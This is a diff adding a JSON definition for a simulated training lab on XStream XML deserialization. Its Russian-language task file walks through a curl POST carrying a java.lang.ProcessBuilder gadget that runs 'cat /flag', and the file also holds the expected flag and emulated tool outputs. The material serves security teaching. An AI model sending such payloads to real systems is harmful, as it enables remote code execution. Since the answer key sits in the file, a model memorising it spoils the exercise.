@@ -1,0 +1,41 @@
+{
+  "id": "web-xstream",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{xstr34m_xml_t4g_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: XStream XML-десериализация\n\nЭндпоинт /import десериализует XML через XStream.\nУкажи класс-гаджет и прочитай флаг.\n\n1. Проверь десериализацию корректным объектом:\n   curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' -d '<user class=\"com.example.User\"><name>alice</name></user>'\n2. Подставь гаджет:\n   curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' -d '<java.lang.ProcessBuilder><command><string>cat</string><string>/flag</string></command></java.lang.ProcessBuilder>'\n3. Запиши флаг в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "XStream 1.4.5 (allowTypes не настроен).\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция api.target/import)",
+      "cases": [
+        {
+          "match": "com\\.example\\.User",
+          "example": "-X POST ... -d '<user class=\"com.example.User\"><name>alice</name></user>'",
+          "output": "User{name=alice}\n"
+        },
+        {
+          "match": "ProcessBuilder",
+          "example": "-X POST ... -d '<java.lang.ProcessBuilder>...'",
+          "output": "nto{xstr34m_xml_t4g_rce}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /import на api.target.\n"
+    }
+  }
+}
